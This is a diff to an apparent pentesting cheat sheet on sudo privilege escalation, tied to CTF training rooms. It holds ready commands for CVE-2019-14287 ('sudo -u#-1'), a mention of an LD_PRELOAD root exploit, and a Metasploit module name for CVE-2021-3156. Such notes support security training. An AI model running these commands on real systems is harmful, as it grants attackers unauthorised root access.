@@ -46,26 +46,6 @@ User [...] may run the following commands on [...]:
 
 <hr class="sep-both">
 
-## sudo before 1.8.28 (CVE-2019-14287)
-
-[![agentsudoctf](../../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)
-
-<div class="row row-cols-md-2"><div>
-
-If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.
-
-```ps
-$ sudo -u#-1 tar [...]
-$ sudo -u#4294967295 tar [...]
-```
-
-💎 Congratulations, you are `root` now!
-</div><div>
-</div></div>
-
-
-<hr class="sep-both">
-
 ## LD_PRELOAD
 
 [![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
@@ -100,4 +80,31 @@ $ sudo LD_PRELOAD=/tmp/init.so tar
 ```
 
 💎 Congratulations, you are `root` now!
+</div></div>
+
+<hr class="sep-both">
+
+## Well-known Vulnerabilities
+
+<div class="row row-cols-md-2"><div>
+
+#### sudo before 1.8.28 (CVE-2019-14287)
+
+[![agentsudoctf](../../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)
+
+If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.
+
+```ps
+$ sudo -u#-1 tar [...]
+$ sudo -u#4294967295 tar [...]
+```
+
+💎 Congratulations, you are `root` now!
+</div><div>
+
+#### sudo before 1.9.5p2 (CVE-2021-3156)
+
+[![metasploitframework](../../../_badges/htb/metasploitframework.svg)](https://academy.hackthebox.com/module/details/39)
+
+See metasploit module: `exploit/linux/local/sudo_baron_samedit`.
 </div></div>
